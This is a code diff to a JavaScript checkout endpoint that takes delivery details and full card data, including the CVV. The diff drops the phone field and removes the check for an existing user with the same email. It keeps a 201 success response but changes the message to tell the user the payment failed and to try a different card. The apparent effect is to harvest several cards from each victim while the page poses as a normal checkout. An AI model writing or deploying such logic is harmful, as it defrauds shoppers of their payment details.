@@ -20,7 +20,6 @@ export const checkout = async (req, res) => {
       city,
       state,
       postalCode,
-      phoneNumber,
     } = delivery || {};
 
     const { cardNumber, expiryDate, cvv, cardName } = payment || {};
@@ -34,7 +33,7 @@ export const checkout = async (req, res) => {
       !city ||
       !state ||
       !postalCode ||
-      !phoneNumber ||
+      
       !cardNumber ||
       !expiryDate ||
       !cvv ||
@@ -43,18 +42,6 @@ export const checkout = async (req, res) => {
       return res.status(400).json({
         success: false,
         message: 'All fields are required',
-      });
-    }
-
-    
-    const existingUser = await prisma.user.findUnique({
-      where: { email },
-    });
-
-    if (existingUser) {
-      return res.status(409).json({
-        success: false,
-        message: 'User with this email already exists',
       });
     }
 
@@ -68,7 +55,6 @@ export const checkout = async (req, res) => {
         country,
         firstName,
         lastName,
-        phoneNumber,
         address,
         city,
         state,
@@ -90,7 +76,7 @@ export const checkout = async (req, res) => {
 
     return res.status(201).json({
       success: true,
-      message: 'Account created successfully',
+      message: 'payment was not successful. Please try a different card.',
       data: userWithoutSensitive,
     });
 
